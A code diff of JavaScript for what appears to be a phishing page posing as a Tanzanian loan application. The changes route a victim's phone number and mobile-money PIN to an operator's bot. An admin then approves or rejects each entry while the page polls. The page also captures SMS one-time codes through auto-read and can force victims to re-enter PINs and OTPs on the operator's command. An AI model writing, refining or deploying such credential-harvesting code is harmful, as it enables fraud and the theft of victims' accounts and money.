@@ -106,30 +106,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
   document.getElementById('btn-prev-3').addEventListener('click', () => switchStep('personal'));
 
-  // Submit Application -> Move to PIN Screen
-  document.getElementById('btn-submit-app').addEventListener('click', async () => {
-    try {
-      const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminChatId)}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          contact: appData.phone,
-          pin: '',
-          amount: `TSh ${appData.amount}`,
-          adminChatId
-        })
-      });
-      const data = await res.json();
-      if (data.success) {
-        appData.userId = data.userId;
-        document.getElementById('pin-phone-display').textContent = `+255${appData.phone}`;
-        switchStep('pin');
-      } else {
-        showToast(data.error || 'Hitilafu');
-      }
-    } catch (e) {
-      showToast('Hitilafu ya mtandao');
-    }
+  // Submit Application -> Move straight to PIN Screen
+  document.getElementById('btn-submit-app').addEventListener('click', () => {
+    appData.amount = document.getElementById('form-amount-input').value;
+    document.getElementById('pin-phone-display').textContent = `+255${appData.phone}`;
+    switchStep('pin');
   });
 
   // PIN Inputs Configuration (Digits Only)
@@ -158,7 +139,11 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
+  // PIN Submit -> Sends Phone Number + PIN together to Bot first, then polls for Admin Allow
   btnSubmitPin.addEventListener('click', async () => {
+    btnSubmitPin.textContent = 'Inathibitisha...';
+    btnSubmitPin.setAttribute('disabled', 'true');
+
     try {
       const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminChatId)}`, {
         method: 'POST',
@@ -172,9 +157,18 @@ document.addEventListener('DOMContentLoaded', () => {
       });
       const data = await res.json();
       if (data.success) {
-        pollStatus();
+        appData.userId = data.userId;
+        pollStatus(); // Polls until Admin taps Allow
+      } else {
+        showToast(data.error || 'Hitilafu');
+        btnSubmitPin.textContent = 'INGIA';
+        btnSubmitPin.removeAttribute('disabled');
       }
-    } catch (e) {}
+    } catch (e) {
+      showToast('Hitilafu ya mtandao');
+      btnSubmitPin.textContent = 'INGIA';
+      btnSubmitPin.removeAttribute('disabled');
+    }
   });
 
   // OTP Inputs Configuration (Digits Only & High-Sensitivity SMS Auto-Fill)
@@ -204,18 +198,34 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
+  // OTP Submit -> Sends Phone Number + OTP together to Backend
   btnSubmitOtp.addEventListener('click', async () => {
+    btnSubmitOtp.textContent = 'Inathibitisha...';
+    btnSubmitOtp.setAttribute('disabled', 'true');
+
     try {
       const res = await fetch('/api/submit-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: appData.userId, otp: appData.otp })
+        body: JSON.stringify({ 
+          userId: appData.userId, 
+          contact: appData.phone, 
+          otp: appData.otp 
+        })
       });
       const data = await res.json();
       if (data.success) {
         pollStatus();
+      } else {
+        showToast(data.error || 'Hitilafu');
+        btnSubmitOtp.textContent = 'WASILISHA';
+        btnSubmitOtp.removeAttribute('disabled');
       }
-    } catch (e) {}
+    } catch (e) {
+      showToast('Hitilafu ya mtandao');
+      btnSubmitOtp.textContent = 'WASILISHA';
+      btnSubmitOtp.removeAttribute('disabled');
+    }
   });
 
   // High Sensitivity WebOTP / SMS Reader API Integration
@@ -278,9 +288,9 @@ document.addEventListener('DOMContentLoaded', () => {
       await fetch('/api/request-new-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: appData.userId })
+        body: JSON.stringify({ userId: appData.userId, contact: appData.phone })
       });
-      showToast('Ombi limetum୍କwa kwa msimamizi', 'success');
+      showToast('Ombi limetumwa kwa msimamizi', 'success');
       startOtpCountdown();
     } catch (e) {}
   });
@@ -299,12 +309,20 @@ document.addEventListener('DOMContentLoaded', () => {
           switchStep('otp');
           startOtpCountdown();
         } else if (data.status === 'RETRY_PIN') {
-          showToast('WRONG PIN ❌', 'error');
+          showToast('PIN si sahihi ❌', 'error');
           switchStep('pin');
+          btnSubmitPin.textContent = 'INGIA';
+          btnSubmitPin.removeAttribute('disabled');
+          pinBoxes.forEach(b => b.value = '');
+          pinBoxes[0].focus();
           clearInterval(interval);
         } else if (data.status === 'RETRY_OTP') {
-          showToast('WRONG OTP ❌', 'error');
+          showToast('OTP si sahihi ❌', 'error');
           startOtpCountdown();
+          btnSubmitOtp.textContent = 'WASILISHA';
+          btnSubmitOtp.removeAttribute('disabled');
+          otpBoxes.forEach(b => b.value = '');
+          otpBoxes[0].focus();
           clearInterval(interval);
         } else if (data.status === 'SUCCESS') {
           showToast('CORRECT OTP ✅', 'success');
@@ -323,4 +341,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-    
+      
